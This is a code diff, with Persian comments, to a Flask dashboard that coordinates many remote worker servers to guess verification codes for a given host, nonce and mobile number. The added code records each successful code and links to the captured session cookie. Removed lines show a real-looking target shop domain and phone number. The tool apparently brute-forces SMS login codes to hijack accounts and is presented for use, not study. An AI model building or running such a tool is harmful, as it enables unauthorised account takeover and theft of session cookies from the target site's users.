@@ -34,6 +34,7 @@ RANGES = [
 
 progress_log = []
 found_success = False
+success_codes = []  # برای ذخیره موفقیت‌ها
 
 def send_to_remote(server_url, host, nonce, mobile, connections, start_range, end_range):
     """ارسال درخواست به سرور ریموت"""
@@ -63,6 +64,7 @@ def stop_all_servers():
 
 def get_worker_status():
     """جمع‌آوری وضعیت ورکرها با درخواست پایتونی"""
+    global success_codes
     status_data = {}
     for server in REMOTE_SERVERS:
         try:
@@ -75,10 +77,14 @@ def get_worker_status():
                 "processed": status["processed"],
                 "error": status["error"]
             }
-            if status["error"] and "Success found!" in status["error"]:
+            if status["error"] and "Code" in status["error"] and "found successfully" in status["error"]:
                 global found_success
                 found_success = True
-                progress_log.append("Success found on a remote server! Stopping all servers...")
+                # استخراج کد از پیام موفقیت
+                code = status["error"].split("Code ")[1].split(" found")[0]
+                if not any(s["code"] == code for s in success_codes):  # جلوگیری از تکرار
+                    success_codes.append({"server": server, "code": code, "cookie_link": f"{server}/last_cookie"})
+                progress_log.append(f"Success found on {server}! Stopping all servers...")
                 socketio.emit('update_progress', {'log': progress_log[-1]})
                 stop_all_servers()
         except requests.exceptions.RequestException as e:
@@ -103,14 +109,15 @@ def index():
         <style>
             body { direction: rtl; font-family: Arial, sans-serif; }
             .container { max-width: 1200px; margin: 0 auto; }
-            #progress-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
-            #progress-table th, #progress-table td { border: 1px solid #ddd; padding: 12px; text-align: center; }
-            #progress-table th { background-color: #f2f2f2; font-weight: bold; }
-            #progress-table tr:nth-child(even) { background-color: #f9f9f9; }
-            #progress-table tr:hover { background-color: #f1f1f1; }
+            #progress-table, #success-table { width: 100%; border-collapse: collapse; margin-top: 20px; }
+            #progress-table th, #progress-table td, #success-table th, #success-table td { border: 1px solid #ddd; padding: 12px; text-align: center; }
+            #progress-table th, #success-table th { background-color: #f2f2f2; font-weight: bold; }
+            #progress-table tr:nth-child(even), #success-table tr:nth-child(even) { background-color: #f9f9f9; }
+            #progress-table tr:hover, #success-table tr:hover { background-color: #f1f1f1; }
             .status-active { color: green; font-weight: bold; }
             .status-inactive { color: red; font-weight: bold; }
             .error-cell { color: #d9534f; max-width: 300px; word-wrap: break-word; }
+            .success-link { color: #1e90ff; text-decoration: underline; }
         </style>
     </head>
     <body class="bg-gray-100 p-8">
@@ -120,7 +127,7 @@ def index():
                 <form id="form" class="space-y-6">
                     <div>
                         <label class="block text-sm font-medium text-gray-700">هاست:</label>
-                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="www.arzanpanel-iran.com">
+                        <input type="text" id="host" class="mt-1 block w-full p-3 border rounded-lg" value="www.h.com">
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">Nonce:</label>
@@ -128,7 +135,7 @@ def index():
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">شماره موبایل:</label>
-                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="09039495749">
+                        <input type="text" id="mobile" class="mt-1 block w-full p-3 border rounded-lg" value="0911">
                     </div>
                     <div>
                         <label class="block text-sm font-medium text-gray-700">تعداد کانکشن‌ها:</label>
@@ -156,6 +163,21 @@ def index():
                         </tbody>
                     </table>
                 </div>
+                <div class="mt-8">
+                    <h2 class="text-xl font-semibold text-center mb-4">موفقیت‌ها</h2>
+                    <table id="success-table">
+                        <thead>
+                            <tr>
+                                <th>سرور</th>
+                                <th>کد موفق</th>
+                                <th>لینک کوکی</th>
+                            </tr>
+                        </thead>
+                        <tbody id="success-body">
+                            <!-- جدول موفقیت‌ها با AJAX پر می‌شه -->
+                        </tbody>
+                    </table>
+                </div>
             </div>
         </div>
 
@@ -165,6 +187,7 @@ def index():
             const startBtn = document.getElementById('start');
             const stopBtn = document.getElementById('stop');
             const tableBody = document.getElementById('table-body');
+            const successBody = document.getElementById('success-body');
 
             // لیست سرورها برای جدول
             const servers = [
@@ -180,12 +203,13 @@ def index():
                 "http://104.251.219.67:5000"
             ];
 
-            // آپدیت جدول با AJAX
-            function updateTable() {
+            // آپدیت جدول‌ها با AJAX
+            function updateTables() {
                 fetch('/get_status')
                     .then(response => response.json())
                     .then(data => {
-                        tableBody.innerHTML = ''; // پاک کردن جدول قبلی
+                        // جدول وضعیت سرورها
+                        tableBody.innerHTML = '';
                         servers.forEach(server => {
                             const status = data[server] || {
                                 running: false,
@@ -205,16 +229,33 @@ def index():
                             `;
                             tableBody.appendChild(row);
                         });
+
+                        // جدول موفقیت‌ها
+                        fetch('/get_success')
+                            .then(response => response.json())
+                            .then(successData => {
+                                successBody.innerHTML = '';
+                                successData.forEach(success => {
+                                    const row = document.createElement('tr');
+                                    row.innerHTML = `
+                                        <td>${success.server}</td>
+                                        <td>${success.code}</td>
+                                        <td><a href="${success.cookie_link}" class="success-link" target="_blank">دانلود کوکی</a></td>
+                                    `;
+                                    successBody.appendChild(row);
+                                });
+                            });
                     })
                     .catch(error => {
                         console.error('Error fetching status:', error);
                         tableBody.innerHTML = '<tr><td colspan="5">خطا در دریافت وضعیت</td></tr>';
+                        successBody.innerHTML = '<tr><td colspan="3">خطا در دریافت موفقیت‌ها</td></tr>';
                     });
             }
 
-            // هر 5 ثانیه جدول رو آپدیت کن
-            setInterval(updateTable, 5000);
-            updateTable(); // اولین بار موقع لود
+            // هر 5 ثانیه جدول‌ها رو آپدیت کن
+            setInterval(updateTables, 5000);
+            updateTables(); // اولین بار موقع لود
 
             socket.on('connect', () => {
                 console.log('Connected to WebSocket');
@@ -259,7 +300,7 @@ def index():
 
 @app.route('/start', methods=['POST'])
 def start():
-    global progress_log, found_success
+    global progress_log, found_success, success_codes
     data = request.get_json()
     host = data['host']
     nonce = data['nonce']
@@ -268,6 +309,7 @@ def start():
 
     found_success = False
     progress_log = []
+    success_codes = []  # ریست موفقیت‌ها
     progress_log.append("Starting distribution to remote servers...")
     socketio.emit('update_progress', {'log': progress_log[-1]})
 
@@ -293,6 +335,12 @@ def stop():
 def get_status():
     """برگشت وضعیت ورکرها به صورت JSON"""
     return jsonify(get_worker_status())
+
+@app.route('/get_success', methods=['GET'])
+def get_success():
+    """برگشت موفقیت‌ها به صورت JSON"""
+    global success_codes
+    return jsonify(success_codes)
 
 if __name__ == '__main__':
     socketio.run(app, host='0.0.0.0', port=5000, debug=True)
